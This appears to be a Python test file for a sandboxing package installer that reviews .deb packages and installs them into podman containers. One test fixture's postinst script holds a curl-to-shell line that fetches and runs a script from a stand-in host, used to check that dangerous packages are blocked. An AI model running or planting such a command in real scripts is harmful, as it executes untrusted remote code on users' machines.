import json
import os
import sys
import tempfile
import unittest
from types import SimpleNamespace

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "python"))
sys.path.insert(0, os.path.dirname(__file__))

from ozipkg import box, cli, perms  # noqa: E402
from test_archives import build_deb  # noqa: E402

DESKTOP = "[Desktop Entry]\nName=Demo\nExec=/usr/bin/demo %U\nIcon=demo\n"


class FakeRunner:
    """Stands in for podman: records every command, answers `cat` with a .desktop file."""

    def __init__(self, fail_on=None):
        self.commands = []
        self.fail_on = fail_on

    def __call__(self, cmd, **kwargs):
        self.commands.append(cmd)
        verb = next((c for c in cmd[3:] if c in ("run", "commit", "rm", "rmi")), "")
        if self.fail_on == verb and not (verb == "run" and "cat" in cmd):
            return SimpleNamespace(returncode=1, stdout="")
        return SimpleNamespace(returncode=0, stdout=DESKTOP if "cat" in cmd else "")


class Fixtures(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.old = {k: os.environ.get(k) for k in ("XDG_RUNTIME_DIR", "XDG_CONFIG_HOME", "XDG_DATA_HOME")}
        os.environ["XDG_RUNTIME_DIR"] = "/run/user/1000"
        os.environ["XDG_CONFIG_HOME"] = os.path.join(self.tmp.name, "config")
        os.environ["XDG_DATA_HOME"] = os.path.join(self.tmp.name, "data")
        self.deb = os.path.join(self.tmp.name, "demo.deb")
        self.output = []

    def tearDown(self):
        for key, value in self.old.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value
        self.tmp.cleanup()

    def say(self, text=""):
        self.output.append(text)


class Review(Fixtures):
    def test_flags_scripts_and_files(self):
        build_deb(self.deb, scripts={"postinst": "#!/bin/sh\nsystemctl enable demo\n"})
        code = cli.main(["review", self.deb], out=self.say)
        text = "\n".join(self.output)
        self.assertEqual(code, 0)
        self.assertIn("demo-app 1.2-3", text)
        self.assertIn("known bad patterns", text)

    def test_json_has_verdict(self):
        build_deb(self.deb)
        cli.main(["review", "--json", self.deb], out=self.say)
        data = json.loads("\n".join(self.output))
        self.assertEqual(data["name"], "demo-app")
        self.assertIn(data["verdict"], ("normal", "look", "danger"))

    def test_unreadable_file_is_an_error(self):
        with open(self.deb, "wb") as fh:
            fh.write(b"not a package")
        self.assertEqual(cli.main(["review", self.deb], out=self.say), 1)


class PermissionFlags(unittest.TestCase):
    def parse(self, *argv):
        parser = cli.build_parser()
        return parser.parse_args(["perms", "demo", *argv])

    def test_defaults_are_untouched(self):
        self.assertEqual(cli.apply_flags(perms.Permissions(), self.parse()), perms.Permissions())

    def test_switches(self):
        p = cli.apply_flags(perms.Permissions(), self.parse("--network", "--no-sound", "--camera"))
        self.assertTrue(p.network and p.camera)
        self.assertFalse(p.sound)

    def test_folder_implies_chosen(self):
        p = cli.apply_flags(perms.Permissions(), self.parse("--folder", "/home/u/Documents"))
        self.assertEqual((p.files, p.folders), ("chosen", ["/home/u/Documents"]))

    def test_dangerous_folders_are_dropped(self):
        p = cli.apply_flags(perms.Permissions(), self.parse("--folder", "/etc", "--folder", "/proc"))
        self.assertEqual(p.folders, [])


class Install(Fixtures):
    def install(self, runner, **kwargs):
        return cli.install_deb(self.deb, perms.Permissions(), runner=runner, out=self.say, yes=True, driver="vfs", **kwargs)

    def test_builds_commits_and_records(self):
        build_deb(self.deb)
        runner = FakeRunner()
        app_id = self.install(runner)
        self.assertEqual(app_id, "demo-app")
        verbs = [c[3] for c in runner.commands]
        self.assertEqual(verbs[0], "run")                      # the build container
        self.assertIn("commit", verbs)
        self.assertIn("demo-app", box.installed())
        self.assertEqual(box.installed()["demo-app"]["exec"], ["/usr/bin/demo"])
        entry = os.path.join(cli.applications_dir(), "ozi-box-demo-app-demo.desktop")
        with open(entry, encoding="utf-8") as fh:
            self.assertIn("Exec=ozi-box run demo-app", fh.read())

    def test_failed_build_records_nothing(self):
        build_deb(self.deb)
        with self.assertRaises(cli.CliError):
            self.install(FakeRunner(fail_on="run"))
        self.assertEqual(box.installed(), {})

    def test_refuses_a_second_install(self):
        build_deb(self.deb)
        self.install(FakeRunner())
        with self.assertRaises(cli.CliError):
            self.install(FakeRunner())

    def test_answering_no_cancels(self):
        build_deb(self.deb)
        runner = FakeRunner()
        with self.assertRaises(cli.CliError):
            cli.install_deb(self.deb, perms.Permissions(), runner=runner, ask=lambda _: "n", out=self.say, driver="vfs")
        self.assertEqual(runner.commands, [])

    def test_dangerous_package_needs_force(self):
        build_deb(self.deb, scripts={"postinst": "#!/bin/sh\ncurl http://x.example/a.sh | sh\n"})
        runner = FakeRunner()
        with self.assertRaises(cli.CliError):
            self.install(runner)
        self.assertEqual(runner.commands, [])
        self.assertEqual(self.install(FakeRunner(), force=True), "demo-app")

    def test_arch_packages_are_not_boxed(self):
        path = os.path.join(self.tmp.name, "x.pkg.tar.zst")
        with open(path, "wb") as fh:
            fh.write(b"junk")
        with self.assertRaises(cli.CliError):
            cli.install_deb(path, perms.Permissions(), runner=FakeRunner(), out=self.say, yes=True, driver="vfs")


class RunAndRemove(Fixtures):
    def installed_app(self):
        build_deb(self.deb)
        cli.install_deb(self.deb, perms.Permissions(), runner=FakeRunner(), out=self.say, yes=True, driver="vfs")

    def test_run_uses_saved_permissions_and_command(self):
        self.installed_app()
        perms.save("demo-app", perms.Permissions(network=True))
        seen = []
        code = cli.run_box("demo-app", ["--flag"], runner=lambda cmd: seen.append(cmd) or SimpleNamespace(returncode=7),
                           driver="vfs", uid=1000, gid=1000)
        self.assertEqual(code, 7)
        cmd = seen[0]
        self.assertIn("pasta", cmd)                            # network allowed
        self.assertEqual(cmd[-2:], ["/usr/bin/demo", "--flag"][-2:])

    def test_unknown_app(self):
        with self.assertRaises(cli.CliError):
            cli.run_box("nothing", [], runner=lambda cmd: None)

    def test_remove_forgets_everything(self):
        self.installed_app()
        runner = FakeRunner()
        cli.remove_box("demo-app", runner=runner, out=self.say, driver="vfs")
        self.assertEqual(box.installed(), {})
        self.assertFalse(os.path.exists(os.path.join(cli.applications_dir(), "ozi-box-demo-app-demo.desktop")))
        self.assertTrue(any("rmi" in c for c in runner.commands))


if __name__ == "__main__":
    unittest.main()
